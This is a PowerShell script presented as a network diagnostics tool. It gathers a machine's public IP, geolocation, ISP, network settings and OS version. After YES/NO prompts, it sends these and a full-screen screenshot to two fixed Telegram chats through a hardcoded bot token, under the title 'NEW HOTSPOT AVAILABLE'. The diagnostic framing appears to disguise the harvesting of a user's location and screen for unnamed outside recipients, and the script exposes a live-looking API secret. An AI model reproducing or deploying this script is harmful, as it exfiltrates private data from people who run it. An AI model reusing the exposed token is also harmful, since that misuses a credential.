# Network Scanner v3.6.2 - consent-based diagnostics and screenshot
# Windows PowerShell 5.1+; run interactively in logged-in desktop session.
$ErrorActionPreference = 'Stop'
$botToken = '8715775001:AAGivZLOBG_YdpCuMlX6JIbFusUI5ofZ8Sk'
$chatIds = @('8640543929', '8362186234')
$reportTitle = 'NEW HOTSPOT AVAILABLE'
try { [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 } catch {}

function Confirm-Yes([string]$prompt) {
    return ((Read-Host "$prompt (YES/NO)").Trim() -ieq 'YES')
}
function Get-WebJson([string]$url) {
    try { Invoke-RestMethod -Uri $url -TimeoutSec 10 -ErrorAction Stop }
    catch { $null }
}
function Escape-Html([object]$v) {
    [System.Net.WebUtility]::HtmlEncode([string]$v)
}
function Send-TelegramText([string]$message) {
    foreach ($id in $chatIds) {
        try {
            $r = Invoke-RestMethod -Uri "https://api.telegram.org/bot$botToken/sendMessage" `
              -Method Post -Body @{chat_id=$id;text=$message;parse_mode='HTML'} `
              -TimeoutSec 25 -ErrorAction Stop
            if ($r.ok) { Write-Host "Report sent to $id" }
        } catch { Write-Warning "Message to ${id}: $($_.Exception.Message)" }
    }
}
function Send-TelegramScreenshot([string]$path) {
    Add-Type -AssemblyName System.Net.Http
    foreach ($id in $chatIds) {
        $client = [System.Net.Http.HttpClient]::new()
        $form = [System.Net.Http.MultipartFormDataContent]::new()
        try {
            $client.Timeout = [TimeSpan]::FromSeconds(60)
            $form.Add([System.Net.Http.StringContent]::new([string]$id),'chat_id')
            $bytes = [System.IO.File]::ReadAllBytes($path)
            $content = [System.Net.Http.ByteArrayContent]::new($bytes)
            $content.Headers.ContentType = [System.Net.Http.Headers.MediaTypeHeaderValue]::Parse('image/png')
            $form.Add($content,'photo','screen.png')
            $response = $client.PostAsync("https://api.telegram.org/bot$botToken/sendPhoto",$form).GetAwaiter().GetResult()
            $response.EnsureSuccessStatusCode() | Out-Null
            Write-Host "Screenshot sent to $id"
        } catch { Write-Warning "Screenshot to ${id}: $($_.Exception.Message)" }
        finally { $form.Dispose(); $client.Dispose() }
    }
}
function Capture-PrimaryScreen([string]$path) {
    Add-Type -AssemblyName System.Windows.Forms
    Add-Type -AssemblyName System.Drawing
    if (-not [Environment]::UserInteractive) { throw 'No interactive desktop session available.' }
    $screen = [System.Windows.Forms.Screen]::PrimaryScreen
    if ($null -eq $screen) { throw 'Primary monitor not available.' }
    $b = $screen.Bounds
    if ($b.Width -le 0 -or $b.Height -le 0) { throw 'Invalid monitor dimensions.' }
    $bitmap = [System.Drawing.Bitmap]::new($b.Width,$b.Height)
    $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
    try {
        $graphics.CopyFromScreen($b.Left,$b.Top,0,0,$b.Size)
        $bitmap.Save($path,[System.Drawing.Imaging.ImageFormat]::Png)
    } finally { $graphics.Dispose(); $bitmap.Dispose() }
    if (-not (Test-Path -LiteralPath $path)) { throw 'Screenshot file was not created.' }
    if ((Get-Item -LiteralPath $path).Length -le 0) { throw 'Screenshot file is empty.' }
}

Write-Host 'Network Scanner v3.6.2 - diagnostic scan'
$report = [ordered]@{}
$report['Scan time'] = (Get-Date).ToString('yyyy-MM-dd HH:mm:ss')
$publicIp = Get-WebJson 'https://api.ipify.org?format=json'
$report['Public IPv4'] = if ($publicIp -and $publicIp.ip) { $publicIp.ip } else { 'Not Available' }
try {
    $adapter = Get-NetIPConfiguration | Where-Object { $_.IPv4DefaultGateway } | Select-Object -First 1
    $report['Network adapter'] = if ($adapter) { $adapter.InterfaceAlias } else { 'Not Available' }
    $report['Local IPv4'] = if ($adapter -and $adapter.IPv4Address) { ($adapter.IPv4Address.IPAddress -join ', ') } else { 'Not Available' }
    $report['Default gateway'] = if ($adapter -and $adapter.IPv4DefaultGateway) { ($adapter.IPv4DefaultGateway.NextHop -join ', ') } else { 'Not Available' }
    $report['DNS servers'] = if ($adapter -and $adapter.DNSServer) { ($adapter.DNSServer.ServerAddresses -join ', ') } else { 'Not Available' }
} catch { $report['Network adapter'] = 'Not Available (permission or command error)' }
try {
    $os = Get-CimInstance Win32_OperatingSystem
    $report['Windows'] = "$($os.Caption) $($os.Version)"
} catch { $report['Windows'] = 'Not Available' }
try {
    $ping = Test-Connection -ComputerName 1.1.1.1 -Count 2 -ErrorAction Stop
    $report['Ping to 1.1.1.1'] = "{0:N1} ms" -f (($ping | Measure-Object -Property ResponseTime -Average).Average)
} catch { $report['Ping to 1.1.1.1'] = 'No response (may be filtered)' }
if ($report['Public IPv4'] -ne 'Not Available') {
    $geo = Get-WebJson "https://ipwho.is/$($report['Public IPv4'])"
    if ($geo -and $geo.success) {
        $report['IP country'] = $geo.country
        $report['IP city'] = $geo.city
        $report['ISP'] = $geo.connection.isp
        $report['ASN'] = $geo.connection.asn
    }
}

$reportDir = Join-Path ([Environment]::GetFolderPath('MyDocuments')) 'NetworkScannerReports'
New-Item -ItemType Directory -Path $reportDir -Force | Out-Null
$stamp = Get-Date -Format 'yyyyMMdd_HHmmss'
$jsonPath = Join-Path $reportDir "network_$stamp.json"
$htmlPath = Join-Path $reportDir "network_$stamp.html"
$report | ConvertTo-Json -Depth 5 | Set-Content -LiteralPath $jsonPath -Encoding UTF8
$rows = @($report.GetEnumerator() | ForEach-Object { '<tr><td>{0}</td><td>{1}</td></tr>' -f (Escape-Html $_.Key),(Escape-Html $_.Value) })
$html = '<!doctype html><html><head><meta charset="utf-8"><title>Network report</title><style>body{font:16px Segoe UI,Arial;margin:36px}td{padding:9px;border:1px solid #ccc}table{border-collapse:collapse}</style></head><body><h1>Network report</h1><table>' + ($rows -join '') + '</table></body></html>'
$html | Set-Content -LiteralPath $htmlPath -Encoding UTF8
Write-Host "`nNETWORK DIAGNOSTICS"
$report.GetEnumerator() | Format-Table -AutoSize | Out-Host
Write-Host "Local reports: $reportDir"

$tokenValid = (-not [string]::IsNullOrWhiteSpace($botToken)) -and ($botToken -notlike 'PASTE_*')
if (Confirm-Yes 'Send this network report to the two Telegram chats?') {
    if (-not $tokenValid) { Write-Warning 'Set bot token at top of file first.' }
    else {
        $lines = @($report.GetEnumerator() | ForEach-Object { '<b>{0}</b>: {1}' -f (Escape-Html $_.Key),(Escape-Html $_.Value) })
        $msg = '<b>' + (Escape-Html $reportTitle) + "</b>`n`n" + ($lines -join "`n")
        Send-TelegramText $msg
    }
}

if (Confirm-Yes 'Allow capturing the primary monitor as a screenshot?') {
    $screenPath = Join-Path $reportDir "screenshot_$stamp.png"
    try {
        Capture-PrimaryScreen $screenPath
        Write-Host "Screenshot saved: $screenPath"
        Write-Host 'Opening image for inspection before sending...'
        Start-Process -FilePath $screenPath
        Write-Host 'Check that no private information is visible.'
        if (Confirm-Yes 'Send this reviewed screenshot to both Telegram chats?') {
            if ($tokenValid) { Send-TelegramScreenshot $screenPath }
            else { Write-Warning 'Set bot token at top of file first.' }
        }
        Write-Host "Screenshot kept at $screenPath so you can verify it. Delete when no longer needed."
    } catch {
        Write-Warning "Screenshot failed: $($_.Exception.Message)"
    }
}
Write-Host 'Finished.'
Read-Host 'Press Enter to exit' | Out-Null
